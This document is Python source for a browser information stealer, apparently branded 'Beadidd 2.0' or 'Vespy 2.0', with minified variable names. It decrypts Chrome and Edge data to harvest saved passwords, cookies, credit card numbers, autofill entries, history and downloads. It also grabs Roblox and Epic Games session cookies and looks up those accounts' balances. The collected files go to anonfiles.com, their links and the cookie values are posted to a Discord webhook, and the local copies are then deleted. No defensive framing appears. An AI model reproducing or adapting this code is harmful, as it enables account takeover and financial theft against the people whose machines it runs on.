T='Beadidd 2.0 | by : Beadidd'
L='author : Beadidd'
K='Vespy 2.0'
S='credsc.txt'
R='Autofill.txt'
Q='Downs.txt'
J='History'
P='Histo.txt'
O='Passw.txt'
N='Cookies.txt'
M='4300d1'
I='EPIC_SSO'
H='EPIC_CLIENT_SESSION'
G='Web Data'
F='wb'
E='https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png'
D='='
C=open
B='AppData'
A='USERPROFILE'
class U:
	def __init__(G,Cookies):
		F=' ';E='Value : ';B=Cookies
		if'Name : .ROBLOSECURITY'in B:
			L=B.split('\n'+D*50)
			for A in L:
				if'ROBLOSECURITY'in A:G.RobloxInfo(A.split(E)[1].replace(F,''))
		if H and I in B:
			J=B.split('\n'+D*50);C=[];K=[]
			for A in J:
				if H in A:C.append(A.split(E)[1].replace(F,''))
			for A in J:
				if I in A:K.append(A.split(E)[1].replace(F,''))
			for A in range(len(C)):
				try:G.EpicInfo(C[A],K[A])
				except:pass
	def EpicInfo(O,ESC,ES):B=ESC;C=requests.get('https://www.epicgames.com/account/personal?lang=en&productName=epicgames',cookies={I:ES,H:B}).text;F=requests.get('https://www.epicgames.com/account/v2/payment/ajaxGetWalletBalance',cookies={I:ES,H:B}).json();G=C.split('"displayName":{"value":"')[1].split('"')[0];J=C.split('"userInfo":{"id":{"value":"')[1].split('"')[0];N=F['walletBalance'];D=DiscordWebhook(url=wbh,username=K,avatar_url=E);A=DiscordEmbed(title=f"EPIC Games Cookies",description=f"Grabbed Epic Games Account",color=M);A.set_author(name=L,icon_url=E);A.set_footer(text=T);A.set_timestamp();A.add_embed_field(name=f"Account of {G}\n",value=f""":id: ID: ``{J}``

:dollar: Balance : ``{N}``

:cookie: EPIC_CLIENT_SESSION : ``{B[:20]}.. REST IN COOKIES``

:cookie: EPIC_SSO : ``{ES}``""");D.add_embed(A);D.execute()
	def RobloxInfo(F,cookie):
		C=cookie
		try:B=requests.get('https://www.roblox.com/mobileapi/userinfo',cookies={'.ROBLOSECURITY':C}).json();D=DiscordWebhook(url=wbh,username=K,avatar_url=E);A=DiscordEmbed(title=f"Roblox Cookie",description=f"Found Roblox Cookie",color=M);A.set_author(name=L,icon_url=E);A.set_footer(text=T);A.set_timestamp();A.add_embed_field(name=f"Account of {B['UserName']}\n",value=f""":id: ID: ``{B["UserID"]}``
:dollar: Robux Balance: ``{B["RobuxBalance"]}``
:crown: Premium: ``{B["IsPremium"]}``

:cookie: Roblox Cookie: ``{C}``
""");A.set_thumbnail(url=B['ThumbnailUrl']);D.add_embed(A);D.execute()
		except:pass
class V:
	def __init__(C):
		H='User Data';G='Local';E='-';C.Cookies=E;C.Passwords=E;C.History=E;C.Downloads=E;C.CCs=E;C.Autofill=E;I=[f"{os.path.join(os.environ[A],B,G,'Microsoft','Edge',H)}",f"{os.path.join(os.environ[A],B,G,'Google','Chrome',H)}"];C.prof=['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5','Profile 6','Profile 7','Profile 8','Profile 9','Profile 10']
		for D in I:
			if os.path.exists(D):
				try:F=C._key(os.path.join(D,'Local State'));C.cookies(D,F);C.passwords(D,F);C.history(D);C.downloads(D);C.ccs(D,F);C.autofill(D)
				except:pass
		J=Thread(target=C._upload);K=Thread(target=U,args=[C.Cookies]);J.start();K.start()
	def _key(B,path):A=None;return CryptUnprotectData(base64.b64decode(loads(C(path,'r',encoding='utf-8').read())['os_crypt']['encrypted_key'])[5:],A,A,A,0)[1]
	def _decrypt(C,b,key):A=AES.new(key,AES.MODE_GCM,b[3:15]);B=A.decrypt(b[15:])[:-16].decode();return B
	def cookies(E,p,key):
		K='Cookies';G=C(os.path.join(os.environ[A],B,N),F)
		for L in E.prof:
			try:
				M=os.path.join(p,L,'Network',K);shutil.copy(M,os.path.join(os.environ[A],B));H=os.path.join(os.environ[A],B,K)
				if os.path.exists(H):
					I=connect(H);J=I.cursor()
					for O in J.execute('SELECT host_key, name, encrypted_value FROM cookies').fetchall():P,Q,R=O;S=E._decrypt(R,key);E.Cookies+=D*50+f"\nHost : {P}\nName : {Q}\nValue : {S}\n"
				J.close();I.close()
			except:pass
		G.write(E.Cookies.encode());G.close()
	def passwords(E,p,key):
		Q='Login Data';M=C(os.path.join(os.environ[A],B,O),F)
		for R in E.prof:
			try:
				S=os.path.join(p,R,Q);shutil.copy(S,os.path.join(os.environ[A],B));N=os.path.join(os.environ[A],B,Q)
				if os.path.exists(N):
					P=connect(N);G=P.cursor()
					for H in G.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall():I,J,K=H;L=E._decrypt(K,key);E.Passwords+=D*50+f"\nURL : {I}\nName : {J}\nPassword : {L}\n"
					for H in G.execute('SELECT origin_url, username_value, password_value FROM logins order by date_created').fetchall():I,J,K=H;L=E._decrypt(K,key);E.Passwords+=D*50+f"\nURL : {I}\nName : {J}\nPassword : {L}\n"
				G.close();P.close()
			except:pass
		M.write(E.Passwords.encode());M.close()
	def history(E,p):
		G=C(os.path.join(os.environ[A],B,P),F)
		for O in E.prof:
			try:
				Q=os.path.join(p,O,J);shutil.copy(Q,os.path.join(os.environ[A],B));H=os.path.join(os.environ[A],B,J)
				if os.path.exists(H):
					I=connect(H);K=I.cursor()
					for R in K.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall():
						L,M,N,S=R
						if L and M and N and S!='':
							if len(E.History)<100000:E.History+=D*50+f"\nURL : {L}\nTitle : {M}\nVisit Count : {N}\n"
						else:break
				K.close();I.close()
			except:pass
		G.write(E.History.encode());G.close()
	def downloads(E,p):
		L='History2';G=C(os.path.join(os.environ[A],B,Q),F)
		for M in E.prof:
			try:
				N=os.path.join(p,M,J);shutil.copy(N,os.path.join(os.environ[A],B,L));H=os.path.join(os.environ[A],B,L)
				if os.path.exists(H):
					I=connect(H);K=I.cursor()
					for O in K.execute('SELECT tab_url, target_path FROM downloads').fetchall():P,R=O;E.Downloads+=D*50+f"\nURL : {P}\nPath : {R}\n"
				K.close();I.close()
			except:pass
		G.write(E.Downloads.encode());G.close()
	def autofill(E,p):
		H=C(os.path.join(os.environ[A],B,R),F)
		for L in E.prof:
			try:
				M=os.path.join(p,L,G);shutil.copy(M,os.path.join(os.environ[A],B,G));I=os.path.join(os.environ[A],B,G)
				if os.path.exists(I):
					J=connect(I);K=J.cursor()
					for N in K.execute('SELECT name, value FROM autofill').fetchall():O,P=N;E.Autofill+=D*50+f"\nName : {O}\nValue : {P}\n"
				K.close();J.close()
			except:pass
		H.write(E.Autofill.encode());H.close()
	def ccs(E,p,key):
		H=C(os.path.join(os.environ[A],B,S),F)
		for L in E.prof:
			try:
				M=os.path.join(p,L,G);shutil.copy(M,os.path.join(os.environ[A],B,G));I=os.path.join(os.environ[A],B,G)
				if os.path.exists(I):
					J=connect(I);K=J.cursor()
					for N in K.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards').fetchall():O,P,Q,R=N;T=E._decrypt(R,key);E.CCs+=D*50+f"""
Name : {O}
Expiration Month : {P}
Expiration Year : {Q}
Card Number : {T}
"""
				K.close();J.close()
			except:pass
		H.write(E.CCs.encode());H.close()
	def _upload(a):
		K='full';J='url';I='data';H='rb';G='https://api.anonfiles.com/upload';D='file'
		try:
			F=os.path.join(os.environ[A],B);U=requests.post(G,files={D:C(os.path.join(os.environ[A],B,O),H)}).json()[I][D][J][K];V=requests.post(G,files={D:C(os.path.join(os.environ[A],B,N),H)}).json()[I][D][J][K];W=requests.post(G,files={D:C(os.path.join(os.environ[A],B,S),H)}).json()[I][D][J][K];X=requests.post(G,files={D:C(os.path.join(os.environ[A],B,P),H)}).json()[I][D][J][K];Y=requests.post(G,files={D:C(os.path.join(os.environ[A],B,Q),H)}).json()[I][D][J][K];Z=requests.post(G,files={D:C(os.path.join(os.environ[A],B,R),H)}).json()[I][D][J][K];T=DiscordWebhook(url=wbh,username='Beadiddd 2.0',avatar_url=E);L=DiscordEmbed(title=f"Browser Stealer",description=f"Found Information About Browsers",color=M);L.set_author(name='author : Beadiddd',icon_url=E);L.set_footer(text='Beadiddd 2.0 | by : Beadiddd');L.set_timestamp();L.add_embed_field(name=f"All Info From Browsers\n\n",value=f""":unlock: Passwords: **{U}**

:cookie: Cookies: **{V}**

:credit_card: CCs: **{W}**

:page_with_curl: History: **{X}**

:arrow_down: Downloads: **{Y}**

:identification_card: Autofill: **{Z}**
""");T.add_embed(L);T.execute()
			try:os.remove(os.path.join(F,N));os.remove(os.path.join(F,O));os.remove(os.path.join(F,S));os.remove(os.path.join(F,P));os.remove(os.path.join(F,Q));os.remove(os.path.join(F,R))
			except:pass
		except:pass